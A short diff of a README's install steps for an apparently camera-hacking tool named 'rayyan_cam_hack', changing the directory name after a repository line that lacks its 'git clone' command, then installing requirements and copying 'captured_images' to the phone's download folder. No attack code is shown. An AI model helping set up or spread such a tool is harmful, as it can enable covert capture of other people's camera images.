@@ -31,7 +31,7 @@ Run the following commands in your Termux or Linux terminal to install:
 apt update && apt upgrade -y
 pkg install git python -y
 https://github.com/RayyanHacke/rayyan_cam_hack.git
-cd Crazy
+cd rayyan_cam_hack
 pip install -r requirements.txt
 cp captured_images/*.jpg /sdcard/Download/
 ```
